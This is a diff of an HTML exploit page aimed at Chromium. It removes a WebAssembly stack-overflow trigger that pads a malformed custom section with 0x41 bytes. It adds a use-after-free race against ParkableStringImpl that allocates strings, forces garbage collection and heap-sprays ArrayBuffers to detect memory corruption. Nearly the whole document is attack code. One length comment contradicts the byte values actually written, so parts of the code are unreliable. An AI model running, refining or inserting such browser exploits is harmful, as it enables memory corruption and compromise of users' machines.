@@ -1,65 +1,94 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Wasm Stack Smash v2</title>
+    <title>ParkableString UAF Trigger</title>
+    <style>
+        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
+        #status { font-size: 1.2em; font-weight: bold; }
+    </style>
 </head>
-<body style="background:#000; color:#0f0; font-family:monospace; font-size: 14px; padding: 10px;">
-    <h3>Satisfying Wasm Validator...</h3>
-    <div id="log">Awaiting execution...<br></div>
+<body>
+    <h2>Chromium Heap UAF - ParkableStringImpl</h2>
+    <div id="status">[*] Preparing heap...</div>
 
     <script>
-        const logEl = document.getElementById('log');
-        function log(msg) { logEl.innerHTML += msg + "<br>"; }
-
-        async function triggerRCE() {
-            log("[*] Packaging structural-valid malicious Wasm...");
-
-            const magic = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00];
-            
-            // We'll build the payload body first to calculate the exact size
-            let payloadBody = [];
-            
-            // 1 byte for Name Length ("x")
-            payloadBody.push(0x01); 
-            // 1 byte for Name string "x"
-            payloadBody.push(0x78); 
-
-            // THE TRIGGER: 0x6a (Hits the vulnerable case in Ghidra)
-            payloadBody.push(0x6a); 
-
-            // THE OVERFLOW: 128 bytes of 0x41 ('A')
-            // This smashes the 8-byte pointer 'local_f0' and the Link Register
-            for (let i = 0; i < 128; i++) {
-                payloadBody.push(0x41);
-            }
-
-            // Section Header
-            let section = [];
-            section.push(0x00); // Section ID 0 (Custom Section)
-            
-            // Length of the body (1 + 1 + 1 + 128 = 131 bytes)
-            // 0x83 0x01 is the LEB128 representation of 131
-            section.push(0x73); 
-            section.push(0x01);
-
-            const wasmBuffer = new Uint8Array([...magic, ...section, ...payloadBody]);
-
-            log("[*] Buffer size: " + wasmBuffer.byteLength + " bytes");
-            log("[*] Launching against V8/Liftoff...");
-
-            try {
-                // This forces the transition from JS to the vulnerable C++ layer
-                const module = await WebAssembly.compile(wasmBuffer);
-                log("<span style='color:orange;'>[-] No crash. Adjusting trigger byte...</span>");
-            } catch (e) {
-                // If it crashes, this code won't run.
-                // If it gives a DIFFERENT error, we are getting closer.
-                log("<span style='color:red;'>[!] Parser Result:</span> " + e.message);
-            }
+        function log(msg) {
+            document.getElementById('status').innerText = msg;
+            console.log(msg);
         }
 
-        setTimeout(triggerRCE, 1000);
+        // Configuration
+        const STRING_SIZE = 10 * 1024 * 1024; // 10MB strings to force Parking
+        const NUM_STRINGS = 50; 
+        let parkedStrings = [];
+        let sprayBuffers = [];
+
+        // 1. Allocate massive, highly compressible strings
+        function allocateStrings() {
+            log("[*] Allocating massive strings to force background compression...");
+            for (let i = 0; i < NUM_STRINGS; i++) {
+                // A repeating pattern is highly compressible, ensuring it gets Parked
+                parkedStrings.push("A".repeat(STRING_SIZE) + i.toString());
+            }
+            
+            // Give Chrome's background threads a moment to park the strings
+            setTimeout(triggerRace, 3000);
+        }
+
+        // 2. The Kill Function: Read -> Free -> Reallocate
+        function triggerRace() {
+            log("[*] Triggering Decompress and racing Garbage Collector...");
+
+            // Step A: Trigger a read on the strings. 
+            // This forces Blink to call ParkableStringImpl::Decompress via base::PostTask
+            let dummy = "";
+            for (let i = 0; i < NUM_STRINGS; i++) {
+                dummy = parkedStrings[i].substring(0, 10); 
+            }
+
+            // Step B: Instantly destroy all references to the strings
+            parkedStrings = null;
+            dummy = null;
+
+            // Step C: Force Garbage Collection NOW.
+            // If the timing is right, the Heap chunks are freed BEFORE the background thread writes to them.
+            if (window.gc) {
+                window.gc();
+            } else {
+                log("[!] window.gc() not available. Run Chrome with --js-flags=\"--expose-gc\"");
+                // Fallback: Attempt to force GC via memory pressure
+                for(let i=0; i < 100; i++) { new ArrayBuffer(1024 * 1024 * 50); }
+            }
+
+            // Step D: The Heap Spray
+            // Rapidly allocate ArrayBuffers of the exact same size as the freed strings.
+            // The Heap allocator will place these directly on top of the freed ParkableString memory.
+            log("[*] Spraying ArrayBuffers to catch the UAF write...");
+            for (let i = 0; i < NUM_STRINGS * 2; i++) {
+                let buffer = new ArrayBuffer(STRING_SIZE);
+                let view = new Uint32Array(buffer);
+                view.fill(0xBBBBBBBB); // Fill with dummy data
+                sprayBuffers.push(view);
+            }
+
+            log("[*] Race condition complete. Checking for crash...");
+            setTimeout(verifyCorruption, 1000);
+        }
+
+        // 3. (Optional) Check if the background thread overwrote our ArrayBuffer
+        function verifyCorruption() {
+            for (let i = 0; i < sprayBuffers.length; i++) {
+                if (sprayBuffers[i][0] !== 0xBBBBBBBB) {
+                    log("[+] MEMORY CORRUPTION DETECTED! UAF SUCCESSFUL.");
+                    document.body.style.backgroundColor = "#500";
+                    return;
+                }
+            }
+            log("[-] No crash or corruption detected. Refresh to try race again.");
+        }
+
+        // Start the exploit
+        window.onload = allocateStrings;
     </script>
 </body>
 </html>
